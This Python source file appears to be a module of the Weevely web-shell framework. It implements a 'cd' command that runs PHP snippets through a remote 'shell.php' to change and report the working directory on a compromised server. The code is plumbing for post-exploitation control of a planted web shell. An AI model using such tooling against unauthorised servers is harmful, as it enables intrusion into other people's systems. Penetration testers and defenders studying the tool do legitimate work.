from core.vectors import Os, Vector
from core.module import Module
from core import messages
import logging, random

class Cd(Module):

    """Change current working directory.
    
    Usage:
      file_cd <folder>
    
    """
    
    def initialize(self):
        
        self._register_infos(
                             {
                             'name' : 'Change directory',
                             'description' : __doc__,
                             'author' : [ 
                                         'Emilio Pinna' 
                                         ],
                              'license' : 'GPLv3'
                              }
                             )
        
        self._register_arguments(
            # Declare mandatory arguments
            arguments = [ 
                         'folder' 
                         ])

        self._register_vectors([
            Vector('ossep' , 'shell.php',  '@print(DIRECTORY_SEPARATOR);'),
            Vector("chdir", 'shell.php', """chdir("${args['folder']}") && print(getcwd());"""),
        ])
        
        self._register_storable_results( { 
                                          'cwd' : '.',
                                          'cw_basedir' : '.',
                                          'ossep' : ''
        })

    def run(self, args):

        ossep = self._get_result('ossep')
        if not ossep:
            ossep = self.terminal.run_shell_php([ self.vectors.get_by_name('ossep').format(args) ])
            
        folder = self.terminal.run_shell_php([ self.vectors.get_by_name('chdir').format(args) ])
        
        if folder:
            self._store_result('cwd', folder)
            
            if ossep not in ('/', '\\'):
                logging.info(messages.module_file_cd.error_getting_ossep)   
            else:      
                self._store_result('cw_basedir', folder.split(ossep)[-1])
            
        else:
            logging.info(messages.module_file_cd.error_folder_s_change_failed % (args['folder']))